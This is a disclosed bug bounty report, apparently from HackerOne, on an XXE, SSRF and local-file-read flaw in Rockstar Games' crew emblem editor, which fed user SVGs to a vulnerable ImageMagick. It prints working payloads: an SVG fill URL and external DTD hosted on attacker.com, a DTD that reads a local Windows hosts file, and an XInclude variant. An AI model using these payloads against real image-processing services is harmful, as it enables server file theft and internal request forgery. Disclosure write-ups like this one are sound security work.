@@ -1,0 +1,61 @@
+ReportLink:https://hackerone.com/reports/347139
+WeaknessName:XML External Entities (XXE)
+Reporter:https://hackerone.com/alexbirsan
+ReportedTo:Rockstar Games(rockstargames)
+BountyAmount:1500.0
+Severity:critical
+State:Closed
+DateOfDisclosure:01.08.2018 15:46:11
+
+Summary:
+This summary is provided by the researcher who submitted this report, @alexbirsan . 
+
+___________________________________________________________________________________________________________________________
+
+About one year after I started messing with the emblem editor, I finally found a full SSRF and LFI. I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem.
+
+For those of you who are not familiar with the emblem editor, the interesting part is a SVG to PNG conversion using user supplied input. The main pieces of my exploit were mostly quirks in the ImageMagick version used by Rockstar:
+
+1. Double forward slash to reference an SMB path:
+
+    ```xml
+    <rect fill=“url(//attacker.com/malicious.svg#exploit)”>
+    ```
+    This allowed me to bypass a regex filter and load arbitrary SVG data into ImageMagick by hosting an external SVG image on my server.
+
+2. Classic XXE:
+
+    ```xml
+<!DOCTYPE svg [
+<!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd">
+%outside;
+]>
+<svg>
+  <defs>
+    <pattern id="exploit">
+      <text x="10" y="10">
+        &exfil;
+      </text>
+    </pattern>
+  </defs>
+</svg>
+```
+    **exfil.dtd**
+
+    ```xml
+<!ENTITY % data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts">
+<!ENTITY exfil "%data;">
+```
+    This particular version of ImageMagick was vulnerable to a regular XXE attack. By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using `//`).
+
+3. Bonus method - XIncludes
+
+    ```xml
+<text x="10" y="10">
+    <xi:include href="https://www.google.com/" parse="text"/>
+</text>
+```
+It turns out XIncludes were also supported here. This allowed me to get the same results as the XXE method, but it's a bit more reliable and straight-forward.
+
+The final POC looked like this:
+{F293137}
